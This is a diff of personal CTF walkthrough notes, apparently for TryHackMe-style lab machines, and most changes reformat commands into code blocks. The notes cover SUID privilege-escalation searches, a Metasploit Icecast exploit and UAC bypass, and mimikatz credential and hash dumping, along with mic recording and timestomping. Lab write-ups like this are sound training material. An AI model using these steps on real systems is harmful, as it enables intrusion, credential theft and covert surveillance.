@@ -163,6 +163,9 @@ ncat 10.49.133.202 21
 
 We found ProFTPD version 1.3.5
 
+Now do this in your machine
+
+
 ```
 sudo mkdir -p /mnt/kenobiNFS
 ```
@@ -198,6 +201,8 @@ ssh -i id_rsa kenobi@10.49.133.202
 We found first flag after login
 
 ##### **Privilege escalation**
+
+Do this in victim's machine
 
 ```
 find / -perm -u=s -type f 2>/dev/null
@@ -283,19 +288,19 @@ John doe email was JD@anthem.com so for Solomon Grundy its JD
 
 ##### 1st Flag
 
-We are hiring
+We are hiring page -> Right Click -> View Page Source
 
 ##### 2nd Flag
 
-inside- /categories
+inside- /categories  -> Right Click -> View Page Source
 
 ##### 3th Flag
 
-We are hiring -> Author John doe
+We are hiring -> Author John doe  -> Right Click -> View Page Source
 
 ##### 4th Flag
 
-cheers to IT department - page source
+cheers to IT department - page source  -> Right Click -> View Page Source
 
 --------------------------------------------------------------------------------------------------------------------------
 
@@ -334,6 +339,8 @@ xfreerdp3 /v:<IP> /u:sg /p:UmbracoIsTheBest! /cert:ignore +clipboard /dynamic-re
 +clipboard -> Enable clipboard sharing
 
 /dynamic-resolution -> Auto-resize the RDP session
+
+We will find a file in C folder
 
 Unhide files in C folder -> edit permissions
 
@@ -391,13 +398,13 @@ find / -name user.txt
 
 We found file inside /var/www/user.txt
 
-**Privilege Escalation**
+##### **Privilege Escalation**
 
 ```
 find / -user root -perm /4000 2>/dev/null
 ```
 
-4000 à permission for SUID
+4000 -> a permission for SUID
 
 2>/dev/null à Used to scrap results of permission denied ones
 
@@ -449,27 +456,37 @@ In CVE details we found vulnerability ICE-cast
 nmap -T4 -p- --script=vuln -vv 10.48.129.48
 ```
 
-search icecast in CVE score (we found vuln cve2014-3704 in port 8000)
+Search icecast in CVE score (we found vuln cve2014-3704 in port 8000)
 
 CVE-2004-1561
 
 But its vulnerability exploit is
 
-Run msfconsole
+Run 
+```
+msfconsole
+```
 
+```
 exploit/windows/http/icecast_header
+```
 
+```
 options
+```
 
+```
 set RHOSTS <IP>
+```
 
-ifconfig
-
-copy tun0 ip
-
+```
 set LHOST IP (your IP from tun0)
+```
 
+```
 run
+```
+
 
 We entered into the machine
 
@@ -477,11 +494,17 @@ Now use ps to check running processes
 
 We saw icecast2.exe was running in dark pc
 
+```
 sysinfo
+```
 
+```
 gets us system info
+```
 
+```
 run post/multi/recon/local_exploit_suggester
+```
 
 Once it completes, it provides us a list of exploits for privilege escalation
 
@@ -490,22 +513,32 @@ For this we will be using this exploit
 exploit/windows/local/bypassuac_eventvwr
 
 Now we will go a step back by Ctrl + Z
-
+`
+```
 use exploit/windows/local/bypassuac_eventvwr
+```
 
 Now we gotta view sessions number so type session for it
 
+```
 set Session 1
+```
 
 Now change LHOST to tun0 IP
 
+```
 exploit
+```
 
 To verify our new privileges type
 
+```
 getprivs
+```
 
+```
 ps
+```
 
 Now we will look for a process with NT\ Authority and can help us
 
@@ -513,36 +546,53 @@ So, for this we will use spoolsv.exe
 
 Now to migrate to that use
 
+```
 migrate -N spoolsv.exe
+```
 
 Now check for user
 
+```
 getuid
+```
 
 Now we gotta use mimikatz to dump passwords
 
+```
 load kiwi
+```
 
 Now to check which options are available
 
+```
 help
+```
 
 Now to get all credentials
 
+```
 creds_all
-
+```
 Now to drop all passwords in hashes
 
+```
 hashdump
+```
 
 For screen record
 
+```
 screenshare
+```
 
 For microphone record
 
+```
 record_mic
+```
 
 To change timestamp of files
 
+```
 timestomp
+```
